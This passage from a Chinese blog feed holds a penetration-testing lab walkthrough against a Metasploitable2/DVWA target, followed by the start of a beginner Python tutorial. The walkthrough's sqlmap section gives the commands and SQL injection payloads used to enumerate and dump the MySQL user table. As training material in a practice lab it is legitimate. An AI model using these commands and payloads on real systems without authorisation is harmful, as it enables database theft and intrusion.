alt="ping"><br><br>可以看到靶机的TTL值为64，而物理机的TTL值为128，这与我们之前的分析结果一致。<br></p><h3 id="使用nmap工具测试物理机和靶机的操作系统。"><a href="#使用nmap工具测试物理机和靶机的操作系统。" class="headerlink" title="使用nmap工具测试物理机和靶机的操作系统。"></a>使用nmap工具测试物理机和靶机的操作系统。<br></h3><p>语法：<code>nmap -O ip地址</code><br><br>现在分别对靶机和物理机进行系统识别：<br><br><img src="https://free.picui.cn/free/2025/06/24/6859ff24f38cf.png" alt="靶机"><br><br>可以看到靶机<code>61.139.2.133</code>的操作系统为<code>Linux 2.6.x</code><br><br><img src="https://free.picui.cn/free/2025/06/24/685a16013a3b0.png" alt="物理机"><br><br>可以看到物理机<code>61.139.2.1</code>的操作系统为<code>Windows 11</code></p><h2 id="识别服务"><a href="#识别服务" class="headerlink" title="识别服务"></a>识别服务</h2><h3 id="使用nmap实施靶机服务版本探测。"><a href="#使用nmap实施靶机服务版本探测。" class="headerlink" title="使用nmap实施靶机服务版本探测。"></a>使用nmap实施靶机服务版本探测。<br></h3><p>语法：<code>nmap -sV ip地址</code><br><br>探测靶机：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a17727826c.png" alt="nmap -sV"><br><br>查询到开放端口的服务版本信息<br></p><h3 id="使用amap工具识别靶机服务信息。"><a href="#使用amap工具识别靶机服务信息。" class="headerlink" title="使用amap工具识别靶机服务信息。"></a>使用amap工具识别靶机服务信息。<br></h3><p>语法：<code>amap &lt;目标IP&gt; &lt;端口,端口,……&gt;</code><br><br>这里以靶机的<code>21</code>、<code>22</code>、<code>80</code>端口为例：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a1a5c73fed.png" alt="amap"><br><br>识别出：</p><ul><li>端口 21：识别为 FTP 服务</li><li>端口 22：识别为 SSH，且识别为 OpenSSH</li><li>端口 80：识别为 HTTP，且识别为 Apache 2 版本</li></ul><h2 id="收集服务信息"><a href="#收集服务信息" class="headerlink" title="收集服务信息"></a>收集服务信息</h2><h3 id="使用smbclient访问物理机和靶机的SMB服务中的共享文件。"><a href="#使用smbclient访问物理机和靶机的SMB服务中的共享文件。" class="headerlink" title="使用smbclient访问物理机和靶机的SMB服务中的共享文件。"></a>使用smbclient访问物理机和靶机的SMB服务中的共享文件。<br></h3><p>语法：<code>smbclient -L ip地址</code><br><br>目的是列出目标主机上的共享文件和目录。<br><br>以靶机<code>61.139.2.133</code>为例：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a1c041c0ba.png" alt="smbclient -L"><br><br>可以看到，列出了靶机里可访问的文件列表：<br></p><ul><li>print$</li><li>tmp</li><li>opt</li><li>IPC$</li><li>ADMIN$</li></ul><p>以靶机<code>61.139.2.1</code>为例：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a1d35b2816.png" alt="smbclient -L"><br><br>可以看到，物理机的安全策略拒绝了访问<br></p><h3 id="通过snmp协议和获取物理机和靶机的信息。（靶机没有snmp协议）"><a href="#通过snmp协议和获取物理机和靶机的信息。（靶机没有snmp协议）" class="headerlink" title="通过snmp协议和获取物理机和靶机的信息。（靶机没有snmp协议）"></a>通过snmp协议和获取物理机和靶机的信息。（靶机没有snmp协议）<br></h3><p>语法：<code>snmpwalk -v 版本 -c 团体字 ip地址</code><br>分别以靶机和物理机为例：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a1e20b61b2.png" alt="snmpwalk"><br><br>均没有返回信息</p><h1 id="漏洞利用-sqlmap"><a href="#漏洞利用-sqlmap" class="headerlink" title="漏洞利用-sqlmap"></a>漏洞利用-sqlmap</h1><p>这里使用<code>Metasploitable2</code>靶机内的<code>dvwa靶场</code>进行演示<br><br>kali中打开火狐浏览器<br><br>访问靶机ip，进入dvwa靶场，用户名：<code>admin</code> 密码：<code>password</code><br><br><img src="https://free.picui.cn/free/2025/06/24/685a441ddd900.png" alt="dvwa"><br><br><br><br>进入后左侧找到<code>DVWA Security</code>，按下图所示将难度设置为<code>Low</code><br><br><img src="https://free.picui.cn/free/2025/06/24/685a44d458814.png" alt="dvwa-level"><br><br><br><br>选择<code>SQL Injection</code>，进而得到<strong>含有get参数的url</strong>：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a46119e5e8.png" alt="dvwa-sql"><br><br><br><br>按<code>F12</code>打开开发者工具，在<code>Storage（应用）</code>选项中找到两个<code>cookie</code>：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a468fa684b.png" alt="dvwa-cookie"><br><br><br></p><h2 id="Step1：检测是否存在注入点"><a href="#Step1：检测是否存在注入点" class="headerlink" title="Step1：检测是否存在注入点"></a>Step1：检测是否存在注入点</h2><p>在kali终端输入：<br><br><code>sqlmap -u &quot;[目标url]&quot; --cookie=&quot;[站点cookie]&quot;</code><br><br>先检测是否存在注入点<br><br><br>对于本人现在的配置情况，应在<code>kali终端</code>输入<br><br><code>sqlmap -u &quot;http://61.139.2.133/dvwa/vulnerabilities/sqli/?id=114514&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=ac5cf12d26ecd51f0cb25fe5bff4acba; security=low&quot; </code><br><br>得到输出如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a4990909b3.png" alt="注入点检测"><br>其中包含如下代码：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)         <span class="comment"># id可注入</span></span><br><span class="line">    Type: boolean-based blind       <span class="comment"># 布尔盲注</span></span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: <span class="built_in">id</span>=114514<span class="string">&#x27; OR NOT 1224=1224#&amp;Submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based       # 报错注入</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=114514&#x27;</span> OR ROW(6734,8485)&gt;(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(6734=6734,1))),0x7162787671,FLOOR(RAND(0)*2))x FROM (SELECT 3026 UNION SELECT 6375 UNION SELECT 8359 UNION SELECT 9413)a GROUP BY x)-- NibJ&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind      <span class="comment"># 时间盲注</span></span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=114514<span class="string">&#x27; AND (SELECT 6395 FROM (SELECT(SLEEP(5)))DnJh)-- KfbF&amp;Submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query       # 联合注入</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 2 columns</span></span><br><span class="line"><span class="string">    Payload: id=114514&#x27;</span> UNION ALL SELECT NULL,CONCAT(0x7176767071,0x5443707a77576671726274535a4256726a67626671744249704c4170506b56577344427048796979,0x7162787671)#&amp;Submit=Submit</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这意味着：<br></p><ul><li>id 这个参数是可注入的</li><li>sqlmap 成功测试出 4 种注入方式（布尔盲注、报错注入、时间盲注、联合注入）</li><li>每种方式都展示了具体的 Payload（注入语句）用于测试</li></ul><h2 id="Step2：展示目标网站的全部数据库"><a href="#Step2：展示目标网站的全部数据库" class="headerlink" title="Step2：展示目标网站的全部数据库"></a>Step2：展示目标网站的全部数据库</h2><p>在终端输入：<code>sqlmap -u &quot;[目标url]&quot; --cookie=&quot;[站点cookie]&quot; --dbs</code><br><br>可获取数据库列表<br><br><br><code>kali</code>输出如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a50019b4e2.png" alt="kali输出"><br><br><br><br>其中，下面展示的这一部分就是目标网站的全部数据库：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] metasploit</span><br><span class="line">[*] mysql</span><br><span class="line">[*] owasp10</span><br><span class="line">[*] tikiwiki</span><br><span class="line">[*] tikiwiki195</span><br></pre></td></tr></table></figure><h2 id="Step3：展示目标数据库的全部数据表"><a href="#Step3：展示目标数据库的全部数据表" class="headerlink" title="Step3：展示目标数据库的全部数据表"></a>Step3：展示目标数据库的全部数据表</h2><p>在终端输入：<code>sqlmap -u &quot;[目标url]&quot; --cookie=&quot;[站点cookie]&quot; --dbs -D [数据库名] --tables</code><br><br>对<code>mysql</code>数据库进行演示，得到输出如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a51490593d.png" alt="数据库表"><br><br><br><br>其中，下面展示的这一部分就是<code>mysql</code>数据库的全部数据表：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[03:17:59] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[03:17:59] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">Database: mysql</span><br><span class="line">[17 tables]</span><br><span class="line">+---------------------------+</span><br><span class="line">| host                      |</span><br><span class="line">| user                      |</span><br><span class="line">| columns_priv              |</span><br><span class="line">| db                        |</span><br><span class="line">| func                      |</span><br><span class="line">| help_category             |</span><br><span class="line">| help_keyword              |</span><br><span class="line">| help_relation             |</span><br><span class="line">| help_topic                |</span><br><span class="line">| proc                      |</span><br><span class="line">| procs_priv                |</span><br><span class="line">| tables_priv               |</span><br><span class="line">| time_zone                 |</span><br><span class="line">| time_zone_leap_second     |</span><br><span class="line">| time_zone_name            |</span><br><span class="line">| time_zone_transition      |</span><br><span class="line">| time_zone_transition_type |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><h2 id="Step4：展示指定表的全部字段"><a href="#Step4：展示指定表的全部字段" class="headerlink" title="Step4：展示指定表的全部字段"></a>Step4：展示指定表的全部字段</h2><p>在终端输入：<code>sqlmap -u &quot;[目标url]&quot; --cookie=&quot;[站点cookie]&quot; --dbs -D [数据库名] --tables -T [表名] --columns</code><br><br>即可获得指定表的全部字段<br><br><br>以<code>mysql</code>的<code>user</code>为例：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a542540f09.png" alt="表字段"><br><br><br><br>其中，下面展示的这一部分就是<code>user</code>表的全部字段：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">[03:30:14] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[03:30:14] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">Database: mysql</span><br><span class="line">Table: user</span><br><span class="line">[37 columns]</span><br><span class="line">+-----------------------+-----------------------------------+</span><br><span class="line">| Column                | Type                              |</span><br><span class="line">+-----------------------+-----------------------------------+</span><br><span class="line">| Host                  | char(60)                          |</span><br><span class="line">| max_user_connections  | int(11) unsigned                  |</span><br><span class="line">| User                  | char(16)                          |</span><br><span class="line">| Alter_priv            | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Alter_routine_priv    | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Create_priv           | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Create_routine_priv   | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Create_tmp_table_priv | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Create_user_priv      | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Create_view_priv      | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Delete_priv           | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Drop_priv             | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Execute_priv          | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| File_priv             | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Grant_priv            | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Index_priv            | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Insert_priv           | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Lock_tables_priv      | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| max_connections       | int(11) unsigned                  |</span><br><span class="line">| max_questions         | int(11) unsigned                  |</span><br><span class="line">| max_updates           | int(11) unsigned                  |</span><br><span class="line">| Password              | char(41)                          |</span><br><span class="line">| Process_priv          | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| References_priv       | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Reload_priv           | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Repl_client_priv      | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Repl_slave_priv       | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Select_priv           | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Show_db_priv          | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Show_view_priv        | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Shutdown_priv         | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| ssl_cipher            | blob                              |</span><br><span class="line">| ssl_type              | enum(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;ANY&#x27;</span>,<span class="string">&#x27;X509&#x27;</span>,<span class="string">&#x27;SPECIFIED&#x27;</span>) |</span><br><span class="line">| Super_priv            | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| Update_priv           | enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     |</span><br><span class="line">| x509_issuer           | blob                              |</span><br><span class="line">| x509_subject          | blob                              |</span><br><span class="line">+-----------------------+-----------------------------------+</span><br></pre></td></tr></table></figure><h2 id="Step5：导出目标数据库"><a href="#Step5：导出目标数据库" class="headerlink" title="Step5：导出目标数据库"></a>Step5：导出目标数据库</h2><p>在终端输入：<code>sqlmap -u &quot;[目标url]&quot; --cookie=&quot;[站点cookie]&quot; --dbs -D [数据库名] --tables -T [表名] --columns -C [字段名] --dump</code><br><br>即可导出指定字段的全部数据<br><br><br>以<code>mysql</code>的<code>user</code>表的<code>User</code>字段为例：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a5653c14fc.png" alt="导出数据"><br><br><br><br>其中，下面展示的这一部分就是<code>user</code>表的<code>User</code>字段的全部数据：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a56d2ce334.png" alt="重要数据"><br><br>可以看出：<br></p><ul><li>目标数据库有 3 个用户：<ul><li><code>debian-sys-maint</code>（系统维护账户）</li><li><code>root</code>（超级管理员）</li><li><code>guest</code>（来宾账户）</li></ul></li><li>所有账户的 Password 字段都是空的（<blank>），说明：<ul><li>这些账户不设置密码，可能可以直接登录数据库！</li></ul></blank></li></ul>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <category domain="https://baiyb.top/tags/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <comments>https://baiyb.top/2025/06/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python一周速通</title>
      <link>https://baiyb.top/2025/06/15/Python%E4%B8%80%E5%91%A8%E9%80%9F%E9%80%9A/</link>
      <guid>https://baiyb.top/2025/06/15/Python%E4%B8%80%E5%91%A8%E9%80%9F%E9%80%9A/</guid>
      <pubDate>Sun, 15 Jun 2025 10:00:24 GMT</pubDate>
      
      <description>放假啦，无聊，一周学一门语言</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>这篇博客完整记录了7天速通Python的过程，下面是在自学期间使用到的资料链接<br></p><ul><li><a href="https://www.cainiaojc.com/python/python-tutorial.html">【菜鸟教程-Python】</a></li><li><a href="https://www.bilibili.com/video/BV1qW4y1a7fU?spm_id_from=333.788.videopod.episodes&vd_source=754fdfd19d49323af99603a90c4dbb56">【黑马程序员python教程，8天python从入门到精通，学python看这套就够了】</a></li></ul><h1 id="安装Python以及PyCharm"><a href="#安装Python以及PyCharm" class="headerlink" title="安装Python以及PyCharm"></a>安装Python以及PyCharm</h1><p>很重要！但是就不详细说明了，下面是安装视频链接，安装版本最新的即可<br><br><a href="https://www.bilibili.com/video/BV1qW4y1a7fU/?p=4&share_source=copy_web&vd_source=76ef81a3c7f598cf017a43cc75c2cf93">【Python安装视频】</a><br><br><a href="https://www.bilibili.com/video/BV1qW4y1a7fU/?p=11&share_source=copy_web&vd_source=76ef81a3c7f598cf017a43cc75c2cf93">【PyCharm安装视频】</a>（最新版和视频里的版本有安装的时候有一点小区别，不要在意）</p><h1 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h1><p>定义：被写下来的<em><strong>固定的值</strong></em><br><br><img src="https://free.picui.cn/free/2025/06/15/684ee3333657d.png" alt="python字面量"><br><br>看着有好多，但是主要学的就是标红的三个部分，其他可以了解一下</p><blockquote><p>如果有学习过其他语言的基础，可以发现很熟悉的 int float和string</p></blockquote><p>我们分门别类的说一下</p><h2 id="整数（int）"><a href="#整数（int）" class="headerlink" title="整数（int）"></a><span style="font-size: 24px; font-weight: bold;">整数（int）</span><br></h2><p>所有整数<br><br>在代码中，整数直接写，例如：100，-10，0等</p><blockquote><p>这边要注意，若想将10赋值到<strong>变量a</strong>，直接写a&#x3D;10即可，不存在int a&#x3D;10这种写法<br><br>但存在int()函数，可以将其他数据类型转换为整数，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="number">10.5</span>)</span><br><span class="line"><span class="built_in">print</span>(a)  <span class="comment"># 输出10,而非10.5</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="浮点数（float）"><a href="#浮点数（float）" class="headerlink" title="浮点数（float）"></a><span style="font-size: 24px; font-weight: bold;">浮点数（float）</span><br></h2><p>所有小数<br><br>在代码中，浮点数直接写，例如：1.0，-1.0，0.0等</p><h2 id="字符串（string）"><a href="#字符串（string）" class="headerlink" title="字符串（string）"></a><span style="font-size: 24px; font-weight: bold;">字符串（string）</span><br></h2><p>被单引号<code>&#39;内容&#39;</code>、双引号<code>&quot;内容&quot;</code>或三引号<code>&quot;&quot;&quot;内容&quot;&quot;&quot;</code>包裹的文本数据<br><br>其中，单引号和双引号没有任何本质上的区别，将一行内容转化为字符串。但三引号可以将多行内容转换为字符串</p><h2 id="代码展示"><a href="#代码展示" class="headerlink" title="代码展示"></a><span style="font-size: 24px; font-weight: bold;">代码展示</span><br></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">10.1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;这是10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;这也是10&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;这是三引号包裹的字符串</span></span><br><span class="line"><span class="string">可以写很多行&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">10.1</span><br><span class="line">这是10</span><br><span class="line">这也是10</span><br><span class="line">这是三引号包裹的字符串</span><br><span class="line">可以写很多行</span><br></pre></td></tr></table></figure><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p>定义：对代码进行解释说明，帮助自己或别人看得懂自己的代码<br><br>（对你没听错，包括自己，当你翻到自己之前写的神秘代码却忘了写的是啥的时候，没有注释真的会死的）<br></p><ul><li>单行注释：以#开头，#后面的内容不会被解释器执行</li><li>多行注释：以’’’开头和结尾，’’’中间的内容不会被解释器执行，可以写很多行<blockquote><p>注意：多行注释不能嵌套使用</p></blockquote></li></ul><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#单行注释可以以任何位置为起点，但只会注释掉#后面的内容</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)    <span class="comment"># 这是单行注释</span></span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>定义：就是在程序运行的时候记录数据的<br><br>格式：变量名称 &#x3D; 变量值<br><br><img src="https://free.picui.cn/free/2025/06/15/684eedc9a5efa.png" alt="变量格式"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">money = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;钱包还有：&quot;</span>,money,<span class="string">&quot;元&quot;</span>)    <span class="comment">#print函数可以输出多个内容，用逗号隔开</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">钱包还有： 10 元</span><br></pre></td></tr></table></figure><p>变量，既然叫做变量，那么说明变量是可以变化的，也就是说变量的值是可以改变的！<br></p><blockquote><p>python支持加减乘除等运算，直接用运算符+ - * &#x2F;即可<br></p></blockquote><p>例如我花了五块钱买了一个冰激凌</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">money = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;钱包还有：&quot;</span>,money,<span class="string">&quot;元&quot;</span>)    <span class="comment">#输出钱包还有： 10 元</span></span><br><span class="line">money = money - <span class="number">5</span>                <span class="comment">#程序将先运算money-5，再将该值赋给money</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;钱包还有：&quot;</span>,money,<span class="string">&quot;元&quot;</span>)    <span class="comment">#输出钱包还有： 5 元</span></span><br></pre></td></tr></table></figure><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>之前我们提到了，python支持多种不同的数据类型，例如整数int、浮点数float、字符串string等等<br><br>同时，我们也学到了使用变量来记录数据<br><br>如果我想知道变量所储存的数据类型，该怎么办呢？<br><br>python给了我们type()函数，可以用来查看数据类型<br><br>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a)) </span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br></pre></td></tr></table></figure><p>表明变量a存储的值的数据类型是int，即整数</p><blockquote><p><span style="color:red">一定要注意！！！变量本身没有类型！有类型的是变量存储的数据！！！</span></p></blockquote><h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><p>定义：用户在编程过程中起的名字，用于给变量、类等命名<br><br>在Python中，起名字有三大规定：</p><ul><li>内容限定</li><li>大小写敏感</li><li>不能是关键字</li></ul><p>下面我们分别解释一下</p><h2 id="内容限定"><a href="#内容限定" class="headerlink" title="内容限定"></a><span style="font-size: 24px; font-weight: bold;">内容限定</span><br></h2><p>在Python中，标识符的内容限定为：</p><ul><li>由字母、数字、下划线组成</li><li>不能以数字开头</li><li>标识符不能包含空格</li></ul><p>例如<code>a</code>&#x2F;<code>a1</code>&#x2F;<code>a_1</code>&#x2F;<code>_a1</code>都是合法的标识符<br><br>但如<code>1a</code>&#x2F;<code>a 1</code>这种，是明显违反内容限定的，并非标识符</p><h2 id="大小写敏感"><a href="#大小写敏感" class="headerlink" title="大小写敏感"></a><span style="font-size: 24px; font-weight: bold;">大小写敏感</span><br></h2><p>python对大小写的要求很严格，具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">andy = <span class="string">&quot;安迪1&quot;</span></span><br><span class="line">Andy = <span class="string">&quot;安迪2&quot;</span></span><br><span class="line"><span class="built_in">print</span>(andy)</span><br><span class="line"><span class="built_in">print</span>(Andy)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安迪1</span><br><span class="line">安迪2</span><br></pre></td></tr></table></figure><p>可以看到，只是一个大小写的区别，导致的输出结果就不同</p><h2 id="不能是关键字"><a href="#不能是关键字" class="headerlink" title="不能是关键字"></a><span style="font-size: 24px; font-weight: 